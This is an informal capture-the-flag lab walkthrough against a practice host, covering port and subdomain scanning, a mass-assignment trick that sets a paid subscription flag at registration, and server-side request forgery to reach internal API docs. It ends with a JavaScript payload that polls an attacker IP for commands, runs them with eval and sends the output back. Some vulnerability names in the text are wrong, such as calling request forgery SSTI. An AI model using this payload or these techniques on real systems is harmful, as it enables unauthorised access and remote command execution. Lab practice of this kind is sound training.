[[nmap]] scan
```shell
nmap -A -T4 -p- 10.10.239.95
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-03 07:49 GMT
Nmap scan report for 10.10.239.95
Host is up (0.11s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3f:da:55:0b:b3:a9:3b:09:5f:b1:db:53:5e:0b:ef:e2 (ECDSA)
|_  256 b7:d3:2e:a7:08:91:66:6b:30:d2:0c:f7:90:cf:9a:f4 (ED25519)
80/tcp    open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://cloudsite.thm/
|_http-server-header: Apache/2.4.52 (Ubuntu)
4369/tcp  open  epmd    Erlang Port Mapper Daemon
| epmd-info: 
|   epmd_port: 4369
|   nodes: 
|_    rabbit: 25672
25672/tcp open  unknown
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 2 hops
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 111/tcp)
HOP RTT       ADDRESS
1   109.88 ms 10.11.0.1
2   110.06 ms 10.10.239.95

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 159.48 seconds
```
open firefox on http://<IP_Maschine> and see this:![[Pasted image 20251106201855.png]]
add thi domain in `/etc/hosts` and use
[[ffuf]] sub domains scan:
```shell
ffuf -u "http://cloudsite.thm" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host: FUZZ.cloudsite.thm" -mc all -ac -t 200

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://cloudsite.thm
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.cloudsite.thm
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: all
________________________________________________

storage                 [Status: 200, Size: 9039, Words: 3183, Lines: 263, Duration: 116ms]
#www                    [Status: 400, Size: 301, Words: 26, Lines: 11, Duration: 116ms]
#mail                   [Status: 400, Size: 301, Words: 26, Lines: 11, Duration: 115ms]
:: Progress: [19966/19966] :: Job [1/1] :: 61 req/sec :: Duration: [0:00:59] :: Errors: 135 ::
```
find `storage.cloudsite.thm`![[Pasted image 20251106202009.png]]
try to create accaount and take data from caido
![[Pasted image 20251106202359.png]]
![[Pasted image 20251106202412.png]]
okay we make a user, log in
```http
HTTP/1.1 200 OK
Date: Thu, 06 Nov 2025 13:24:41 GMT
Server: Apache/2.4.52 (Ubuntu)
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
Content-Length: 8
ETag: W/"8-1Daj9A4+zOiWAQvpnc8ApXe5Cao"
Set-Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6IjEyM0BtYWlsLmNvbSIsInN1YnNjcmlwdGlvbiI6ImluYWN0aXZlIiwiaWF0IjoxNzYyNDM1NDgxLCJleHAiOjE3NjI0MzkwODF9.55w_zoiQ_OCeZeWc8BxdaDDQbj_8ZAUPFeBobMimGKI; Max-Age=3600; Path=/; Expires=Thu, 06 Nov 2025 14:24:41 GMT; HttpOnly
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive

inactive
```
and we have jwt when we login and this on page 
![[Pasted image 20251106202553.png]]
check jwt in `jwt.io`
![[Pasted image 20251106202632.png]]
i tried "alg":"none" and delete sertificate and it's doesnt working:(, after i think about `Mass Assignment` what if i send "subscription": "active" then send a registr request
try it now 
![[Pasted image 20251106203026.png]]
and its successful
![[Pasted image 20251106203049.png]]
log in and
![[Pasted image 20251106203225.png]]
we are in 
on page we can download files from URL and open them but
![[Pasted image 20251106203837.png]]
we cant to use our scripts because application delete extension, u think its a dead and i decided to forget abou page now, i need more data about application(i used Ferroxbuster but dont save scan, know what we have /api endpoints lets check all of them)

```shell
ffuf -u "http://storage.cloudsite.thm/api/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints-res.txt -ac -mc all -t 200 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://storage.cloudsite.thm/api/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/api/api-endpoints-res.txt
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: all
________________________________________________

register                [Status: 405, Size: 36, Words: 4, Lines: 1, Duration: 146ms]
Register                [Status: 405, Size: 36, Words: 4, Lines: 1, Duration: 183ms]
register                [Status: 405, Size: 36, Words: 4, Lines: 1, Duration: 183ms]
docs                    [Status: 403, Size: 27, Words: 2, Lines: 1, Duration: 181ms]
docs/                   [Status: 403, Size: 27, Words: 2, Lines: 1, Duration: 189ms]
docs                    [Status: 403, Size: 27, Words: 2, Lines: 1, Duration: 121ms]
LogIn                   [Status: 405, Size: 36, Words: 4, Lines: 1, Duration: 120ms]
docs                    [Status: 403, Size: 27, Words: 2, Lines: 1, Duration: 118ms]
Login                   [Status: 405, Size: 36, Words: 4, Lines: 1, Duration: 117ms]
login                   [Status: 405, Size: 36, Words: 4, Lines: 1, Duration: 117ms]
register                [Status: 405, Size: 36, Words: 4, Lines: 1, Duration: 121ms]
uploads                 [Status: 401, Size: 32, Words: 3, Lines: 1, Duration: 117ms]
:: Progress: [12334/12334] :: Job [1/1] :: 1485 req/sec :: Duration: [0:00:09] :: Errors: 0 ::
```
hands check:![[Pasted image 20251106205113.png]] and nothing interestiong on another pages, 
i tried take page from our URL upload `http://storage.cloudsite.thm/api/docs` ![[Pasted image 20251106210357.png]]
Mayde SSTI take page from http://127.0.0.1:80 ![[Pasted image 20251106210511.png]]
page from site SSTI works, now bruteforce ports with Caido ![[Pasted image 20251106211029.png]]
![[Pasted image 20251106211510.png]]
try http://127.0.0.1:3000/api/docs and we can see this![[Pasted image 20251106211618.png]]
we see test page with POST request
go to caido and start handcheck ![[Pasted image 20251106213414.png]]
![[Pasted image 20251106213944.png]]
XSS 
maybe applicaton paste string in code, lets try to start shell from shell.js
```js
(function(){
  const attacker = "http://10.11.147.65:9000";

  function send(data) {
    fetch(attacker + "/shell", {
      method: "POST",
      body: JSON.stringify({ output: data }),
      headers: { "Content-Type": "application/json" }
    });
  }

  function poll() {
    fetch(attacker + "/cmd")
      .then(res => res.text())
      .then(cmd => {
        try {
          let result = eval(cmd);
          send(result);
        } catch(e) {
          send("Error: " + e.toString());
        }
      })
      .catch(() => {});
  }

  setInterval(poll, 3000);
})();
```




